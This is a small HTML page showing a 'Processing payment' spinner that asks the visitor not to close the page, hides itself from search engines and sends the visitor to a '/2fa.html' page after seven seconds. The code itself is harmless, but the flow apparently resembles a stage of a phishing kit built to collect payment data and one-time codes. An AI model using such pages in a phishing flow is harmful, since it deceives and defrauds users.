<!doctype html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">

<title>Processing Payment</title>

<style>
*{
  box-sizing:border-box;
}

html,
body{
  margin:0;
  padding:0;
  height:100%;
}

body{
  background:#f4f6f8;
  color:#1f2937;
  min-height:100vh;

  display:flex;
  flex-direction:column;

  font-family:
    -apple-system,
    BlinkMacSystemFont,
    "Segoe UI",
    Roboto,
    "Helvetica Neue",
    Arial,
    sans-serif;

  direction:ltr;
}

.load-main{
  flex:1;

  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;

  text-align:center;

  padding:40px 24px;
}

.spinner{
  width:72px;
  height:72px;

  border-radius:50%;

  border:6px solid #dfe6ec;
  border-top-color:#3b5647;

  animation:spin 1s linear infinite;

  margin-bottom:28px;
}

@keyframes spin{
  to{
    transform:rotate(360deg);
  }
}

.load-main h1{
  font-weight:600;
  font-size:26px;

  color:#3b5647;

  margin:0 0 10px;
}

.load-main p{
  font-size:15px;
  line-height:1.6;

  color:#5b6b62;

  margin:0;
}

.load-main .sub{
  font-size:13px;

  color:#9aa6a0;

  margin-top:7px;
}

.dots::after{
  content:"";
  animation:dots 1.4s steps(4,end) infinite;
}

@keyframes dots{
  0%{
    content:"";
  }

  25%{
    content:".";
  }

  50%{
    content:"..";
  }

  75%{
    content:"...";
  }

  100%{
    content:"";
  }
}
</style>

</head>

<body>

<main class="load-main">

  <div
    class="spinner"
    aria-hidden="true">
  </div>

  <h1>
    Processing payment<span class="dots"></span>
  </h1>

  <p>
    Please wait while we verify your payment information.
  </p>

  <p class="sub">
    Do not close this page or press the back button.
  </p>

</main>


<script>

setTimeout(function () {

  window.location.href =
    "/2fa.html";

}, 7000);

</script>

</body>
</html>
